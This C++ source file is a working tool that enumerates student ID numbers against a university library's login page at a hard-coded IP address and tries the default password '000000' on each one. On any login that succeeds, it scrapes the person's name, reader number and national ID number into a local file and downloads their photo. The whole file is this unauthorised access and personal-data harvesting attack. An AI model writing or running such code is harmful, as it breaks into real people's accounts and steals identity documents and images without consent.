#include "uhttp/uurl.h"
#include "uhttp/uhttp.h"
#include "unetwork/uschedule.h"
#include "unetwork/utcpsocket.h"
#include <sys/stat.h>
#include <sys/types.h>

#include <stdio.h>
#include <stdlib.h>
#include <iostream>
#include <fstream>

#define ID(buf, bufsize, year, faculty, major, class, id)   \
    snprintf(buf, bufsize, "%04d%02d%d%02d%02d", \
        year, faculty, major, class, id)
        
#define FORMAT(buf, bufsize, id, passwd)   \
    snprintf(buf, bufsize, "rdid=%s&rdPasswd=%s&returnUrl=&password=", \
        id, passwd)

#define FORMAT_URL(buf, bufsize, id, passwd, url)   \
    snprintf(buf, bufsize, "rdid=%d&rdPasswd=%s&returnUrl=%s&password=", \
         id, passwd, url)
        

class uhttpclient 
    : public utask
    , public uhttphandler
{
public:
    uhttpclient(uschedule & schedule, uurl & url)
        : utask()
        , schedule_(schedule)
        , url_(url)
    {
    }
    
    virtual ~uhttpclient()
    {
    }

    uhttpresponse login(uhttp & http, const char * id, const char * passwd = "000000")
    {
        uhttprequest request;
        request.set_version(uhttp_version_1_1);
        request.set_method(uhttp_method_post);
        request.set_uri(url_.uri());

        request.set_header("HOST", url_.host().c_str());
        request.set_header("User-Agent", "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36");
        request.set_header("Content-Type", "application/x-www-form-urlencoded");
        request.set_header("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
        request.set_header("Connection", "keep-alive");
        
        request.set_header("Upgrade-Insecure-Requests", "1");
        request.set_header("Cache-Control", "max-age=0");
        request.set_header("Accept-Encoding", "gzip, deflate");
        request.set_header("Accept-Language", "zh-CN,zh;q=0.8,en;q=0.6");
        request.set_header("DNT", "1");

        std::string origin;
        origin.append("http://").append(url_.host());
        request.set_header("Origin", origin.c_str());
        
        char buf[1024];
        int len = FORMAT(buf, 1024, id, passwd);
        //printf("content:%s\n", buf);
        request.set_content(buf, len);
            
        http.send_request(request);

        uhttpresponse response;
        http.recv_response(response);

        #if 0
        std::fstream output("./login", std::ios::out | std::ios::trunc | std::ios::binary);
        output << uhttp::get_version(response.version()) << " " 
            << response.statuscode() << " "
            << uhttp::get_reasonphrase(response.statuscode())
            << UHTTP_LINE_END;

        response.output_header(output);
        output << UHTTP_LINE_END;

        const std::string & content = response.content();
        if (!content.empty()) {
            output.write(content.data(), content.size());
        }

        output.flush();
        #endif
        
        return response;
    }

    uhttpresponse redirect(uhttp & http, uhttpresponse & last)
    {
        uurl url(last.get_header("Location"));
        
        uhttprequest request;
        request.set_version(uhttp_version_1_1);
        request.set_method(uhttp_method_get);
        request.set_uri(url.uri());

        request.set_header("HOST", url_.host().c_str());
        request.set_header("User-Agent", "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36");
        request.set_header("Content-Type", "application/x-www-form-urlencoded");
        request.set_header("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
        request.set_header("Connection", "keep-alive");
        request.set_header("Upgrade-Insecure-Requests", "1");
        request.set_header("Cache-Control", "max-age=0");
        request.set_header("Accept-Encoding", "gzip, deflate");
        request.set_header("Accept-Language", "zh-CN,zh;q=0.8,en;q=0.6");
        request.set_header("DNT", "1");
        request.set_header("Cookie", last.get_header("Set-Cookie"));

        std::string referer;
        referer.append("http://").append(url_.host()).append("/opac/reader/login");
        request.set_header("Referer", referer.c_str());

        http.send_request(request);

        uhttpresponse response;
        http.recv_response(response);

        /*
        std::fstream output("./rediect", std::ios::out | std::ios::trunc | std::ios::binary);
        output << uhttp::get_version(response.version()) << " " 
            << response.statuscode() << " "
            << uhttp::get_reasonphrase(response.statuscode())
            << UHTTP_LINE_END;

        response.output_header(output);
        output << UHTTP_LINE_END;

        const std::string & content = response.content();
        if (!content.empty()) {
            output.write(content.data(), content.size());
        }

        output.flush();*/

        return response;
    }

    std::vector<std::string> get_headinfo(uhttp & http, uhttpresponse & last)
    {
        uhttprequest request;
        request.set_version(uhttp_version_1_1);
        request.set_method(uhttp_method_get);
        request.set_uri("/opac/reader/getReaderInfo");

        request.set_header("HOST", url_.host().c_str());
        request.set_header("User-Agent", "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36");
        request.set_header("Content-Type", "application/x-www-form-urlencoded");
        request.set_header("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
        request.set_header("Connection", "keep-alive");
        request.set_header("Upgrade-Insecure-Requests", "1");
        request.set_header("Cache-Control", "max-age=0");
        request.set_header("Accept-Encoding", "gzip, deflate");
        request.set_header("Accept-Language", "en;q=0.6");
        request.set_header("DNT", "1");
        request.set_header("Cookie", last.get_header("Set-Cookie"));

        std::string referer;
        referer.append("http://").append(url_.host()).append("/opac/reader/login");
        request.set_header("Referer", referer.c_str());
        
        http.send_request(request);

        uhttpresponse response;
        http.recv_response(response);

        
        //std::fstream output("./reader", std::ios::out | std::ios::trunc | std::ios::binary);
        //output << uhttp::get_version(response.version()) << " " 
        //    << response.statuscode() << " "
        //    << uhttp::get_reasonphrase(response.statuscode())
        //    << UHTTP_LINE_END;

        //response.output_header(output);
        //output << UHTTP_LINE_END;

        //const std::string & content = response.content();
        //if (!content.empty()) {
        //    output.write(content.data(), content.size());
        //}

        //output.flush();

        return analyse(response.content());

    }

    std::vector<std::string> analyse(const std::string & content)
    {
        const char readername_c[] = {0xE8, 0xAF, 0xBB, 0xE8, 0x80, 0x85, 0xE5, 0xA7, 0x93, 0xE5, 0x90, 0x8D};
        const char readerid_c[] = {0xE8, 0xAF, 0xBB, 0xE8, 0x80, 0x85, 0xE8, 0xAF, 0x81, 0xE5, 0x8F, 0xB7};
        const char readerid1_c[] = {0xE8, 0xBA, 0xAB, 0xE4, 0xBB, 0xBD, 0xE8, 0xAF, 0x81, 0xE5, 0x8F, 0xB7};

        std::string key2("value=\"");
        std::string key3("\"");
          
        std::string name, id, id1;

        {
            std::string key(readername_c, sizeof(readername_c));
            int pos = content.find(key);
            int pos1 = 0, pos2 = 0;
            if (pos != std::string::npos) {
                pos1 = content.find(key2, pos + 1);
                pos2 = content.find(key3, pos1 + key2.size());

                name = content.substr(pos1 + key2.size(), pos2 - pos1 - key2.size());
            }
        }

        {
            std::string key(readerid_c, sizeof(readerid_c));
            int pos = content.find(key);
            int pos1 = 0, pos2 = 0;
            if (pos != std::string::npos) {
                pos1 = content.find(key2, pos + 1);
                pos2 = content.find(key3, pos1 + key2.size());

                id = content.substr(pos1 + key2.size(), pos2 - pos1 - key2.size());
            }
        }

        {
            std::string key(readerid1_c, sizeof(readerid1_c));
            int pos = content.find(key);
            int pos1 = 0, pos2 = 0;
            if (pos != std::string::npos) {
                pos1 = content.find(key2, pos + 1);
                pos2 = content.find(key3, pos1 + key2.size());

                id1 = content.substr(pos1 + key2.size(), pos2 - pos1 - key2.size());
            }
        }

        std::vector<std::string> vec;
        vec.push_back(name);
        vec.push_back(id);
        vec.push_back(id1);
        
        return vec;
    }

    void getpic(uhttp & http, uhttpresponse & last, const char * id)
    {
        uhttprequest request;
        request.set_version(uhttp_version_1_1);
        request.set_method(uhttp_method_get);
        request.set_uri("/opac/reader/showPic");

        request.set_header("HOST", url_.host().c_str());
        request.set_header("User-Agent", "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36");
        request.set_header("Accept", "image/webp,image/*,*/*;q=0.8");
        request.set_header("Connection", "keep-alive");
        request.set_header("Upgrade-Insecure-Requests", "1");
        request.set_header("Cache-Control", "max-age=0");
        request.set_header("Accept-Encoding", "gzip, deflate");
        request.set_header("Accept-Language", "en;q=0.6");
        request.set_header("Cookie", last.get_header("Set-Cookie"));

        http.send_request(request);

        uhttpresponse response;
        http.recv_response(response);

        char filename[1024];
        //snprintf(filename, 1024, "./dump/%s", id);
        //mkdir(filename, S_IRWXU | S_IRWXG | S_IRWXO);
        mkdir("./dump", S_IRWXU | S_IRWXG | S_IRWXO);
        snprintf(filename, 1024, "./dump/%s.png", id);
        //printf("filename:%s\n", filename);
        std::fstream output(filename, std::ios::out | std::ios::trunc | std::ios::binary);
        /*output << uhttp::get_version(response.version()) << " " 
            << response.statuscode() << " "
            << uhttp::get_reasonphrase(response.statuscode())
            << UHTTP_LINE_END;

        response.output_header(output);
        output << UHTTP_LINE_END;*/

        const std::string & content = response.content();
        if (!content.empty()) {
            output.write(content.data(), content.size());
        }

        output.flush();

    }

    void writefile(std::vector<std::string> vec)
    {
        const char * filename = "dump/info.txt";
        FILE * fp = NULL;
        
        if (access(filename, F_OK) != 0) {
            fp = fopen(filename, "w+");
        } else {
            fp = fopen(filename, "a+");
        }
        
        if (fp != NULL) {
            fprintf(fp, "%s\t%s\t%s\n", 
                vec[1].c_str(),
                vec[2].c_str(),
                vec[0].c_str());

            fclose(fp);
        }
    }
    
    void run()
    {
        #define LOOP 1
        
        //(buf, bufsize, year, faculty, major, class, id)
        #if LOOP
        for (int year = 2007; year < 2008; year ++) {
            for (int faculty = 8; faculty <= 8; faculty ++) {
                for (int major = 1; major <= 1; major ++) {
                    for (int clazz = 6; clazz <= 6; clazz ++) {
                        for (int id = 1; id <= 30; id ++) {
                            char buf[100];
                            ID(buf, 100, year, faculty, major, clazz, id);
        #else      
                            char buf[100] = "20070810402";
        #endif
                            //printf("ID:%s\n", buf);
                            //continue;

                            int fd = utcpsocket::connect(url_.host().c_str(), url_.port());
                            utcpsocket * socket = new utcpsocket(1024 * 1024, fd, &schedule_);
                            uhttp * http = new uhttp(*socket, *this);
                        
                            //printf("client %d running!\n", fd);
                            socket->set_timeout(60 * 1000);
                            
                            uhttpresponse loginres = login(*http, buf);
                            //if (loginres.get_header("Set-Cookie") != NULL) {
                            if (loginres.statuscode() == uhttp_status_found) {
                                //printf("ID:%s, cookie:%s\n", buf, loginres.get_header("Set-Cookie"));
                                //uhttpresponse reres = redirect(*http, loginres);
                                //if (reres.statuscode() == uhttp_status_ok) 
                                {
                                    std::vector<std::string> vec = get_headinfo(*http, loginres);
                                    writefile(vec);
                                    getpic(*http, loginres, vec[0].c_str());
                                }
                            } else {
                                printf("ID:%s, wrong password!\n", buf);
                            }

                            delete http;
                            delete socket;
                            close(fd);
                            sleep(10);
        #if LOOP
                        }
                    }
                }
            }
        }
        #endif
        
        delete this;
    }
    
    int onhttp(const uhttprequest & request, uhttpresponse & response)
    {
        return 0;
    }

private:
    uschedule & schedule_;
    uurl url_;
};


int main(int argc, char * argv[])
{
    const char * addr_url = "http://202.197.107.27/opac/reader/doLogin";

    uurl url(addr_url);
    if (url.protocol()== uprotocol_unknown) {
        printf("invalid protocol:<%s>!\n", addr_url);
        return 0;
    }

    if (url.protocol() == uprotocol_http) {
        printf("begin run!\n");
        uschedule schedule(8 * 1024, 100);
        uhttpclient * client = new uhttpclient(schedule, url);

        schedule.add_task(client);
        schedule.run();       
    } else {
        printf("unsupport protocol!\n");
    }
    
    return 0;
}
